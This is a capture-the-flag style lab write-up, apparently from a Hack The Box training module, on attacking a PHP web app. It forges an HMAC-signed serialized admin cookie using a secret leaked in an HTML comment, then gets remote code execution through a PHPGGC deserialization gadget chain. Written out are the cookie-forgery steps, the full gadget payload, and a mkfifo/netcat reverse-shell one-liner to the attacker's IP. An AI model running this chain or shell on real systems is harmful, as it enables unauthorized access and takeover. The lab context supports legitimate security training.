In this second lab, the approach will be "black-box" style as we are not provided any source code and my assumption is since the first lab involved a flask application this one will be PHP based so we will have to perform a PHP deserialization to gain the foothold into the system. The challenge involves in 2 steps where first we need to get the admin token and access the portal, next RCE.

------------------------------------------------------------------------------------------------------
1)Now opening the page and checking with Wappalizer we can see that the page is a PHP 7.x and supports both a login/register function so I suggest we can star by registering our username and logging into portal..
And upon login we have the following token:
Cookie: `auth=YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.ec7bb3106f1e1160734408669665170d3fcd11a8`

------------------------------------------------------------------------------------------------------
2) I decided to run the dirsearch and seems like we have some /admin portals?

```
Target: http://10.129.204.98:8080/

[09:11:49] Starting: 
[09:11:52] 404 -    0B  - /%C0%AE%C0%AE%C0%AF
[09:11:52] 404 -    0B  - /%ff
[09:11:53] 404 -  535B  - /js
[09:11:57] 200 -    2KB - /.htaccess
[09:12:39] 404 -  536B  - /css
[09:12:44] 404 -  590B  - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[09:12:49] 200 -   17KB - /favicon.ico
[09:12:52] 200 -    1KB - /home.php
[09:12:53] 404 -  536B  - /img
[09:12:54] 200 -    2KB - /index.php/login/
[09:12:55] 404 -  536B  - /js/
[09:12:57] 200 -    2KB - /login
[09:12:57] 200 -    2KB - /login.php
[09:12:57] 200 -    2KB - /login/administrator/
[09:12:57] 200 -    2KB - /login/admin/
[09:12:57] 200 -    2KB - /login/
[09:12:57] 200 -    2KB - /login/admin/admin.asp
[09:12:57] 200 -    2KB - /login/cpanel.php
[09:12:57] 200 -    2KB - /login/cpanel.aspx
[09:12:57] 200 -    2KB - /login/cpanel.jsp
[09:12:57] 200 -    2KB - /login/cpanel.html
[09:12:57] 200 -    2KB - /login/cpanel.js
[09:12:57] 200 -    2KB - /login/cpanel/
[09:12:57] 200 -    2KB - /login/index
[09:12:57] 200 -    2KB - /login/login
[09:12:57] 200 -    2KB - /login/super
[09:12:57] 200 -    2KB - /login/oauth/
[09:12:57] 302 -    0B  - /logout/  ->  http://10.129.204.98:8080/login
[09:12:57] 302 -    0B  - /logout  ->  http://10.129.204.98:8080/login
[09:13:08] 200 -    2KB - /register
[09:13:08] 200 -    2KB - /register.php
[09:13:09] 200 -   25B  - /robots.txt
[09:13:11] 404 -    0B  - /servlet/%C0%AE%C0%AE%C0%AF
```

But not much seems helping so checking the app source code we can see a lefover that states that the secret is used(most likely HMAC in place) and the SHA1 should still be used?

```
<!-- 
For debugging purposes: @pp_s3cret!! 
TODO: Swap SHA1 for SHA256
--> 

```

Trying to B64 decode the cookie we can see it's structure:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# echo "YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.ec7bb3106f1e1160734408669665170d3fcd11a8" | base64 -d | xxd
base64: invalid input
00000000: 613a 333a 7b73 3a32 3a22 6964 223b 733a  a:3:{s:2:"id";s:
00000010: 313a 2233 223b 733a 383a 2275 7365 726e  1:"3";s:8:"usern
00000020: 616d 6522 3b73 3a37 3a22 796f 7665 6369  ame";s:7:"yoveci
00000030: 6f22 3b73 3a34 3a22 726f 6c65 223b 733a  o";s:4:"role";s:
00000040: 313a 2231 223b 7d                        1:"1";}

```

Now we see it's clearly a php serialization but we need to understand exactly how does it look like in the base?

```
<?php
//The serialized code to be de-serialized
$serialized = 'a:3:{s:2:"id";s:1:"3";s:8:"username";s:7:"yovecio";s:4:"role";s:1:"1";}';
print("The serialized string is: \r\n");
print($serialized . "\r\n");
print("The un-serialized string is: \r\n");
$unserialized = unserialize($serialized);
print_r($unserialized);
?>

This shows that the base string to be used must be:
The un-serialized string is: 
Array
(
    [id] => 3
    [username] => yovecio
    [role] => 1
)

```

Knowing this we should be able to parse the role and make it admin? Might be that is enought to change the role from 1 to 0?
We can write a simila payload that serializes the string based on the idexes we ship:
<
```
?php
//The array to be serialized
$payload = array("id" => "3","username" => "yovecio", "role" => "0" );
print("The un-serialized payload is: \r\n");
print_r($payload);
print("\r\n\r\nThe serialized payload is: " . "\r\n");
$serialized = serialize($payload);
print($serialized . "\r\n\r\n");
print("The B64 encoded payload is: " . base64_encode($serialized));
?>
```

And this indeed match with what we decoded!
The un-serialized payload is: 

```
Array
(
    [id] => 3
    [username] => yovecio
    [role] => 0
)
```

The serialized payload is: 
`a:3:{s:2:"id";s:1:"3";s:8:"username";s:7:"yovecio";s:4:"role";s:1:"0";}`

The B64 encoded payload is: `YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjAiO30=`  

------------------------------------------------------------------------------------------------------
3)But the token isn't working and the reason is that the token is first B64 encoded and then url encoded. The first part is B64encoded but then . should not be URL encoded, and the second part I guess is the SHA1 of the password? 
But this is only partially true as the first part will match out payload so if we take the base token: `YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.ec7bb3106f1e1160734408669665170d3fcd11a8`

The url decoding whows us this:
`YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjEiO30=.ec7bb3106f1e1160734408669665170d3fcd11a8`
The first part before the . must be replaced with out code and then will be
`MYBASE64PAYLOAD.ec7bb3106f1e1160734408669665170d3fcd11a8`

Which results in:
`YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjAiO30=.ec7bb3106f1e1160734408669665170d3fcd11a8`

Then url encoded:
`YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjE6IjIiO30%3D.ec7bb3106f1e1160734408669665170d3fcd11a8`

When we test the cookie we get the message that cookie have been tamplered which confirm my thesis that HMAC(SHA1) is in place:
Error: authentication cookie was tampered with! 
We could use this one to perfor, the hmac: https://www.php.net/manual/en/function.hash-hmac.php
But my guessing is that it need to be performed over the second part of the the message after the dot(.) since it seems like a HMAC indeed...
Next I tried to HMAC the whole serialized string and it passed the check baby!

------------------------------------------------------------------------------------------------------
4)Now knowing that there is 3 users(our, admin & bdmyy) after playing around seem like if we target the userid=2(aka bmdyy) we can see the flag!
```
(
    [id] => 2
    [username] => yovecio
    [role] => admin
)

<h1 class="content-subhead">New post / Flag: HTB{a9c1863ecc6775e6c5fd2597d47a1d29}</h1>

```

------------------------------------------------------------------------------------------------------
5)Beeing part of Administrators role now let us export the posts, but what I have found out seem like we can also import our code and add new posts. If we try to export a post we can see that a string get's exported.

```
└─# curl -H "Cookie: auth=YTozOntzOjI6ImlkIjtzOjE6IjIiO3M6ODoidXNlcm5hbWUiO3M6NzoieW92ZWNpbyI7czo0OiJyb2xlIjtzOjU6ImFkbWluIjt9.02182590400b874104b9d26d702601455403de8c" http://10.129.89.61:8080/export/3 
YTo1OntzOjI6ImlkIjtzOjE6IjMiO3M6OToiYXV0aG9yX2lkIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MTM6IkNWRS0yMDE5LTAyMzIiO3M6NDoiYm9keSI7czo3ODM6Ik9yY2kgdmFyaXVzIG5hdG9xdWUgcGVuYXRpYnVzIGV0IG1hZ25pcyBkaXMgcGFydHVyaWVudCBtb250ZXMsIG5hc2NldHVyIHJpZGljdWx1cyBtdXMuIFByb2luIHZlbCBjb25zZXF1YXQgdmVsaXQsIGluIGN1cnN1cyBtYWduYS4gU3VzcGVuZGlzc2UgY29uZGltZW50dW0gbGliZXJvIGFjIHRvcnRvciBzb2RhbGVzIHZlaGljdWxhLiBRdWlzcXVlIHRlbGx1cyB2ZWxpdCwgcG9ydGEgaWQgYWNjdW1zYW4gZnJpbmdpbGxhLCBwZWxsZW50ZXNxdWUgYWMgbmlzaS4gRG9uZWMgdml2ZXJyYSBzZWQgZWxpdCB2ZWwgbWF0dGlzLiBFdGlhbSB0dXJwaXMganVzdG8sIG1vbGxpcyB2aXRhZSBsaWd1bGEgc2l0IGFtZXQsIGNvbmRpbWVudHVtIHVsdHJpY2VzIGVuaW0uIE1vcmJpIHF1aXMgdGluY2lkdW50IGxlY3R1cywgaW4gdGVtcG9yIHNlbS4gQ3JhcyBlZ2V0IGNvbnZhbGxpcyB0dXJwaXMuIEludGVyZHVtIGV0IG1hbGVzdWFkYSBmYW1lcyBhYyBhbnRlIGlwc3VtIHByaW1pcyBpbiBmYXVjaWJ1cy4gTnVsbGEgZmFjaWxpc2kuIEN1cmFiaXR1ciBhdWN0b3IgdmVuZW5hdGlzIGxlY3R1cyBhdCBsdWN0dXMuIEludGVnZXIgcXVpcyBtYWduYSBzaXQgYW1ldCBwdXJ1cyBvcm5hcmUgZWdlc3Rhcy4gTnVsbGEgZmFjaWxpc2kuIFBlbGxlbnRlc3F1ZSBldSBzZW0gdml0YWUgbWFzc2EgbGFvcmVldCBmZXJtZW50dW0uIE5hbSBjdXJzdXMsIG1hdXJpcyBpZCBhbGlxdWFtIHVsdHJpY2VzLCBhdWd1ZSBleCBkYXBpYnVzIG1pLCB1dCBwZWxsZW50ZXNxdWUgb2RpbyBlbmltIG5vbiBuaXNpLiI7czo4OiJjYXRlZ29yeSI7czozOiJDVkUiO30=
```

As you see it's B64 encoded so let's try to decode it:
```
a:5:{s:2:"id";s:1:"3";s:9:"author_id";s:1:"1";s:5:"title";s:13:"CVE-2019-0232";s:4:"body";s:783:"Orci varius natoque ..... nisi.";s:8:"category";s:3:"CVE";}
```

------------------------------------------------------------------------------------------------------
6)My first attempt will be to totally ignore the post structure and generate a revshell via PHPGCC and import it via Import function:
```
──(root㉿kali-bello)-[/home/millycash/Downloads/Tools/phpggc]
└─# ./phpggc CodeIgniter4/RCE2 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.140 5555 >/tmp/f' -b
TzozOToiQ29kZUlnbml0ZXJcQ2FjaGVcSGFuZGxlcnNcUmVkaXNIYW5kbGVyIjoxOntzOjg6IgAqAHJlZGlzIjtPOjQ1OiJDb2RlSWduaXRlclxTZXNzaW9uXEhhbmRsZXJzXE1lbWNhY2hlZEhhbmRsZXIiOjI6e3M6MTI6IgAqAG1lbWNhY2hlZCI7TzoxNzoiQ29kZUlnbml0ZXJcTW9kZWwiOjg6e3M6MTA6IgAqAGJ1aWxkZXIiO086MzI6IkNvZGVJZ25pdGVyXERhdGFiYXNlXEJhc2VCdWlsZGVyIjoyOntzOjY6IlFCRnJvbSI7YToxOntpOjA7czoyOiIoKSI7fXM6MjoiZGIiO086Mzg6IkNvZGVJZ25pdGVyXERhdGFiYXNlXE15U1FMaVxDb25uZWN0aW9uIjowOnt9fXM6MTM6IgAqAHByaW1hcnlLZXkiO047czoxNToiACoAYmVmb3JlRGVsZXRlIjthOjE6e2k6MDtzOjg6InZhbGlkYXRlIjt9czoxODoiACoAdmFsaWRhdGlvblJ1bGVzIjthOjE6e3M6NDoiaWQueCI7YToxOntzOjU6InJ1bGVzIjthOjI6e2k6MDtzOjY6InN5c3RlbSI7aToxO3M6MjoiZGQiO319fXM6MTM6IgAqAHZhbGlkYXRpb24iO086MzM6IkNvZGVJZ25pdGVyXFZhbGlkYXRpb25cVmFsaWRhdGlvbiI6MTp7czoxNToiACoAcnVsZVNldEZpbGVzIjthOjE6e2k6MDtzOjU6ImZpbmZvIjt9fXM6MjE6IgAqAHRlbXBBbGxvd0NhbGxiYWNrcyI7aToxO3M6MjoiZGIiO086Mzg6IkNvZGVJZ25pdGVyXERhdGFiYXNlXE15U1FMaVxDb25uZWN0aW9uIjowOnt9czoyMDoiY2xlYW5WYWxpZGF0aW9uUnVsZXMiO2I6MDt9czoxMDoiACoAbG9ja0tleSI7YToxOntzOjE6IngiO3M6NzQ6InJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8c2ggLWkgMj4mMXxuYyAxMC4xMC4xNS4xNDAgNTU1NSA+L3RtcC9mIjt9fX0=
```

and this indeed spawn us a shell!
```
──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# nc -lvnp 5555              
listening on [any] 5555 ...
connect to [10.10.15.140] from (UNKNOWN) [10.129.89.61] 36312
sh: 0: can't access tty; job control turned off
$ ls
ls
dir
css
favicon.ico

```

And now we can grab the last flag:
```
htbear@academy:/var/www/htbear$ cat flag.txt
cat flag.txt
HTB{4f35303d9497d249a01f83dd7774fb39}
```
